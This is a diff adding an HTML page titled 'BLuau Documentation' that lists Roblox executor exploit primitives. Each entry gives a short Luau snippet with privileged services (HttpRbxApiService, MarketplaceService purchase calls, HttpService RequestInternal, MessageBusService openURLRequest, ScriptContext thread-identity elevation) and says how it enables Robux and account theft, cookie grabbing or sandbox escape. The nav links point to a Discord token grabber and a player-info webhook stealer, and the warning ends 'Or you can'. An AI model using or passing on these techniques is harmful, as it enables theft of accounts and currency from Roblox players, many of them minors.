@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RCE</title>
+  <link rel="stylesheet" href="prism.css">
+  <script defer src="prism.js"></script>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    ::-webkit-scrollbar {
+      width: 2px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #ffffff;
+      border-radius: 1px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #6b6b6b;
+      border-radius: 1px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #6b6b6b;
+    }
+
+    header {
+      background-color: #1a1a1a;
+      padding: 20px;
+      text-align: center;
+      opacity: 0;
+      animation: fadeInUp 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        transform: translateY(-20px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    h1 {
+      color: #3498db;
+    }
+
+    h2 {
+      font-size: 50px;
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    #content {
+      margin: 20px;
+      text-align: left;
+      background: transparent;
+      border-radius: 10px;
+      padding: 20px;
+      opacity: 0;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    .warning {
+      background-color: #850b0b;
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 24px;
+    }
+
+    #exploit-container {
+      max-height: 650px;
+      overflow-y: auto;
+    }
+
+    .exploit-section {
+      margin-bottom: 30px;
+      opacity: 0;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    .exploit-code {
+      background-color: transparent;
+      padding: 15px;
+      border-radius: 5px;
+      white-space: pre-wrap;
+    }
+
+    code {
+      display: block;
+      color: #ecf0f1;
+      font-size: 14px;
+      font-family: 'Courier New', monospace;
+      overflow-x: auto;
+    }
+
+    .code-description {
+      color: #95a5a6;
+      margin-top: 10px;
+    }
+
+    a {
+      color: #3498db;
+      text-decoration: none;
+    }
+
+    footer {
+      background-color: transparent;
+      padding: 10px;
+      text-align: center;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      opacity: 0;
+      animation: fadeInUp 1s ease-in-out forwards;
+    }
+
+    pre {
+      border-radius: 17px;
+    }
+
+    nav {
+      background-color: #333;
+      padding: 10px;
+      text-align: center;
+  }
+
+  nav a {
+      color: white;
+      text-decoration: none;
+      padding: 10px;
+      margin: 0 10px;
+      font-weight: bold;
+  }
+  </style>
+</head>
+
+<body>
+  <nav>
+    <a href="https://github.com/YellowGreg/Discord-Token-Grabber">Discord-Token-Logger</a>
+    <a href="https://github.com/StevenK-293/Roblox-Player-Info-Webhook">Webhook-Player-Info</a>
+</nav>
+
+<header>
+    <h1>BLuau Documentation</h1>
+</header>
+  <div id="content">
+    <div class="warning">
+      <p><strong>Warning:</strong> This information is provided to raise awareness about potential vulnerabilities.
+        Do not attempt to exploit or misuse any of the following information. (Or you can)</p>
+    </div>
+
+    <div id="exploit-container">
+      <div class="exploit-section" id="HttpRbxApiService">
+        <h2>HttpRbxApiService</h2>
+        <p>You can abuse the <a href="https://robloxapi.github.io/ref/class/HttpRbxApiService.html"
+            target="_blank">HttpRbxApiService</a> Service of Roblox that is normally only accessible by
+          CoreScripts but since Executors have the thread level of 8, you have the permissions to use the
+          service!</p>
+        <div class="exploit-code language-lua">
+          <pre>
+                        <code>
+                            -- LuaU code to grab the amount of robux that the user has
+                            local robux = game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency")
+                            print(robux)
+                        </code>
+                    </pre>
+        </div>
+        <p class="code-description">This code sends an account authenticated request to the Roblox API to grab
+          the amount of robux that the user has, and it can be abused to steal robux and account
+          information.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>BrowserService</h2>
+        <p>Roblox's <a href="https://robloxapi.github.io/ref/class/BrowserService.html"
+            target="_blank">BrowserService</a> was again, only meant to be accessed by CoreScripts. Using this service
+          will open up a ton of critical vulnerabilities, such as cookie grabbing, auto downloading malicious files,
+          executing JavaScript that may potentially be malicious, and more.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to open a Google URL using BrowserService<br>
+                    game:GetService("BrowserService"):OpenBrowserWindow('https://google.com')
+                </code>
+              </pre>
+        </div>
+        <p class="code-description">This code uses the BrowserService to open a Google URL. Abusing BrowserService can
+          lead to critical vulnerabilities like cookie grabbing and executing potentially malicious JavaScript.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>GuiService</h2>
+        <p>Just like HttpRbxApiService, GuiService can be abused to send authenticated requests to the Roblox API.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to open a Google URL using GuiService<br>
+                    game:GetService("GuiService"):OpenBrowserWindow('https://google.com/')
+                </code>
+            </pre>
+        </div>
+        <p class="code-description">This code uses the GuiService to open a Google URL. GuiService, like BrowserService,
+          can be abused to send authenticated requests to the Roblox API.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>MarketplaceService</h2>
+        <p>The service <a href="https://robloxapi.github.io/ref/class/MarketplaceService.html"
+            target="_blank">MarketplaceService</a> has a lot of functions that can be used to steal a Roblox Account's
+          Robux.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+            local m = game:GetService("MarketplaceService")
+
+            -- gets the account's balance and prints it
+            local r = m:GetRobuxBalance()
+            print(r)
+
+            -- below can be used to steal robux
+
+            -- if you wish to see the function's required parameters, check the docs:         https://robloxapi.github.io/ref/class/MarketplaceService.html
+            m:PerformPurchase()
+            m:PerformPurchaseV2()
+            m:PromptNativePurchaseWithLocalPlayer()
+            m:PromptNativePurchase()
+            m:PromptCollectiblesPurchase()
+            m:PromptGamePassPurchase()
+            m:PromptBundlePurchase()
+            m:PromptThirdPartyPurchase()
+            m:PromptRobloxPurchase()
+            m:PromptProductPurchase()
+            m:PromptPurchase()
+
+            -- in the docs, there are also signals that could be potentially fired by an executor's firesignal function. if you have already done blocking the other functions above in your executor, consider blocking firesignal from firing those malicious signals.
+                </code>
+            </pre>
+        </div>
+        <p class="code-description">This code demonstrates various functions in MarketplaceService that can be abused to
+          steal a Roblox Account's Robux. Be cautious and avoid using these functions.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>HttpService</h2>
+        <p>You've probably already tried sending requests to the Roblox API with HttpService at one point, and it throws
+          the error "HttpService can't access ROBLOX resources." But did you know that there is an unrestricted function
+          in HttpService, allowing you to send authenticated requests to the API, resulting in Robux Stealer Scripts?
+          Introducing: RequestInternal!</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to send an authenticated request to the Roblox API using RequestInternal<br>
+                    game:GetService("HttpService"):RequestInternal({Url = "https://www.google.com/"})
+                </code>
+            </pre>
+        </div>
+        <p class="code-description">This code demonstrates the use of RequestInternal in HttpService to send
+          authenticated requests to the Roblox API. Exercise caution as this can lead to unauthorized access.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>OpenCloudService</h2>
+        <p><a href="https://robloxapi.github.io/ref/class/OpenCloudService.html" target="_blank">OpenCloudService</a> is
+          a new Service added to Roblox, and again, it allowed you to send authenticated requests to the Roblox API.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to send an authenticated request to the Roblox API using OpenCloudService<br>
+                    game:GetService("OpenCloudService"):HttpRequestAsync({Url = 'https://google.com'})
+                </code>
+            </pre>
+        </div>
+        <p class="code-description">This code uses OpenCloudService to send an authenticated request to the Roblox API.
+          Be aware of potential security risks associated with abusing this service.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>MessageBusService</h2>
+        <p>We can abuse MessageBusService to access the openUrlRequest messages
+          which lets us escape the sandbox, resulting in an RCE or Remote Code Execution vulnerability.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to publish openURLRequest messages and potentially escape the sandbox<br>
+                    game:GetService("MessageBusService"):Publish(game:GetService("MessageBusService"):GetMessageId("Linking", "openURLRequest"), {url = "notepad.exe"})
+                </code>
+            </pre>
+        </div>
+        <p class="code-description">This code abuses MessageBusService to access openUrlRequest messages, potentially
+          leading to Remote Code Execution (RCE) vulnerabilities. Avoid such practices to ensure a secure environment.
+        </p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>game:HttpGet</h2>
+        <p>In most Roblox loadstring scripts, you might've seen "game:HttpGet" after it. That's the function that sends
+          the GET request to a specific URL to grab a script, and loadstring is the one that looks for LuaU code in the
+          URL provided. This can be abused by sending authenticated requests to the Roblox API, resulting in Robux
+          Stealers, Account Stealers and more.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to send authenticated requests to the Roblox API using game:HttpGet<br>
+                    game:HttpGet('REPLACE THIS WITH ROBLOX API URL')
+                </code>
+              </pre>
+        </div>
+        <p class="code-description">This code showcases the use of game:HttpGet to send authenticated requests to the
+          Roblox API. Be cautious as this can lead to the creation of scripts for stealing Robux and accounts.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>request Function</h2>
+        <p>The Roblox <a href="https://github.com/unified-naming-convention/NamingStandard/blob/main/README.md"
+            target="_blank">Unified Naming Convention (UNC)</a> has a custom function called "request," its alias can be
+          http_request, http, syn.request, and more. And since 99% of executors support UNC, this becomes critical. This
+          can be abused to send authenticated requests to the Roblox API.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to send authenticated requests to the Roblox API using the request function<br>
+                    request({<br>
+                      Url = 'https://google.com',<br>
+                      Method = 'GET' -- u can use post<br>
+                    })<br>
+                    -- For POST requests, add the application/json header
+                </code>
+              </pre>
+        </div>
+        <p class="code-description">This code demonstrates the use of the "request" function, following the Unified
+          Naming Convention (UNC), to send authenticated requests to the Roblox API. Exercise caution due to its
+          potential for unauthorized access.</p>
+      </div>
+
+      <div class="exploit-section">
+        <h2>Bypassing blocked functions with ScriptContext</h2>
+        <p>CHECK <a
+            href="https://gist.github.com/TheGreatSageEqualToHeaven/969422baa43854d717bb651f6edda4b3#roblox-and-exploit-fundamentals"
+            target="_blank">James Napora's Github Gist</a> FOR MORE INFORMATION Basically, this uses ScriptContext to
+          create a CoreScript and parent it to an actor and elevating its thread identity to 8, allowing you to use the
+          functions above even if they were blocked.</p>
+        <div class="exploit-code language-lua">
+          <pre>
+          <code>
+                    -- LuaU code to bypass blocked functions using ScriptContext<br>
+                    game:GetService("ScriptContext"):AddCoreScriptLocal("CoreScripts/ProximityPrompt", actor)
+                </code>
+          </pre>
+        </div>
+        <p class="code-description">This code highlights a method to bypass blocked functions using ScriptContext,
+          potentially enabling the use of functions even if they were blocked. Understand the associated risks and avoid
+          such practices for security reasons.</p>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <p>&copy; 2023 AdvanceFalling Team</p>
+  </footer>
+</body>
+
+</html>
